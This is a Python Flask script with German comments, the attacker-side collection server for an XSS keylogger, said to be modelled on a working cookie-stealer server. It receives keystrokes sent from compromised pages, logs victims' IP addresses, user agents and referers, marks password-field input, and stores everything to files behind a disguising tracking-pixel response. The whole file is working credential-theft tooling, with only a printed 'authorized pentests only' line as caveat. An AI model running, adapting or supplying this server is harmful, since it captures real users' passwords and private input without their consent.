#!/usr/bin/env python3
"""
XSS Keylogger Server - FIXED VERSION
Basiert 1:1 auf dem FUNKTIONIERENDEN Cookie-Stealer-Server
"""

import json
import os
from datetime import datetime
from pathlib import Path
from flask import Flask, request, Response
from urllib.parse import unquote

class KeyloggerServer:
    def __init__(self, config_path="config.json"):
        self.config = self.load_config(config_path)
        self.app = Flask(__name__)
        self.keystrokes = []
        self.setup_routes()

    def load_config(self, config_path):
        """Lädt Konfiguration aus JSON-Datei"""
        config_file = Path(__file__).parent / config_path
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)

    def setup_routes(self):
        """Richtet Flask-Routes ein"""

        @self.app.route('/log', methods=['GET', 'POST', 'OPTIONS'])
        def log_keystroke():
            """Empfängt Keystrokes via GET"""
            # Handle CORS Preflight
            if request.method == 'OPTIONS':
                response = self.create_tracking_pixel_response()
                response.headers['Access-Control-Allow-Origin'] = '*'
                response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
                response.headers['Access-Control-Allow-Headers'] = '*'
                return response

            # Extract keystroke from query param
            key = request.args.get('k')
            field = request.args.get('f', 'unknown')
            session_id = request.args.get('s', 'default')

            if key:
                keystroke_data = {
                    "timestamp": datetime.now().isoformat(),
                    "key": key,
                    "field": field,
                    "session_id": session_id,
                    "ip": request.remote_addr,
                    "user_agent": request.headers.get('User-Agent'),
                    "referer": request.headers.get('Referer')
                }

                self.keystrokes.append(keystroke_data)
                self.log_keystroke(keystroke_data)

                # Save every 10 keystrokes
                if len(self.keystrokes) % 10 == 0:
                    self.save_keystrokes()

                # Console output
                is_password = 'password' in field.lower()
                icon = "🔑" if is_password else "⌨️"
                print(f"{icon} [{field:15}] {key}", end='', flush=True)

            # Return 1x1 transparent GIF (EXACTLY like cookie stealer)
            return self.create_tracking_pixel_response()

        @self.app.route('/status')
        def status():
            """Status-Endpoint"""
            return {
                "status": "running",
                "total_keystrokes": len(self.keystrokes),
                "server": "XSS Keylogger FIXED"
            }

    def log_keystroke(self, keystroke_data):
        """Schreibt Keystroke in TXT-Log-Datei"""
        log_file = Path(__file__).parent / self.config['keylogger_server']['log_file']
        log_file.parent.mkdir(parents=True, exist_ok=True)

        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"{keystroke_data['timestamp']} | {keystroke_data['field']:15} | {keystroke_data['key']}\n")

    def save_keystrokes(self):
        """Speichert alle Keystrokes in JSON-Datei"""
        output_file = Path(__file__).parent / self.config['keylogger_server']['keystrokes_output']
        output_file.parent.mkdir(parents=True, exist_ok=True)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                "metadata": {
                    "server": "KeyloggerServerFixed",
                    "timestamp": datetime.now().isoformat(),
                    "version": "2.0"
                },
                "keystrokes": self.keystrokes,
                "statistics": {
                    "total_keystrokes": len(self.keystrokes),
                    "unique_ips": len(set(k['ip'] for k in self.keystrokes))
                }
            }, f, indent=2, ensure_ascii=False)

    def create_tracking_pixel_response(self):
        """Erstellt 1x1 transparentes GIF als Response (EXACTLY wie Cookie-Stealer)"""
        # 1x1 transparent GIF (43 bytes)
        gif_data = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
            b'\x44\x01\x00\x3b'
        )

        response = Response(gif_data, mimetype='image/gif')
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        return response

    def run(self):
        """Startet den Keylogger Server"""
        host = self.config['keylogger_server']['host']
        port = self.config['keylogger_server']['port']

        print("\n" + "="*80)
        print("⌨️  XSS KEYLOGGER SERVER - FIXED (basiert auf Cookie-Stealer)")
        print("="*80)
        print(f"Server gestartet auf: http://{host}:{port}/log")
        print(f"Status-Endpoint:      http://{host}:{port}/status")
        print(f"\nWICHTIG: Nur für autorisierte Penetrationstests verwenden!")
        print(f"\nWarte auf Keystrokes...")
        print("="*80)
        print(f"\nLEGENDE: ⌨️  = Normal | 🔑 = Password-Feld")
        print(f"{'-'*80}\n")

        # Threaded=True für bessere Fehlerbehandlung
        self.app.run(host=host, port=port, debug=False, threaded=True)


if __name__ == "__main__":
    try:
        server = KeyloggerServer()
        server.run()
    except KeyboardInterrupt:
        print("\n\n[*] Server beendet.")
        print("[*] Keystrokes wurden gespeichert.")
    except Exception as e:
        print(f"\n[!] Fehler: {e}")
        print("[*] Stelle sicher, dass config.json vorhanden ist und Port 8889 verfügbar ist.")
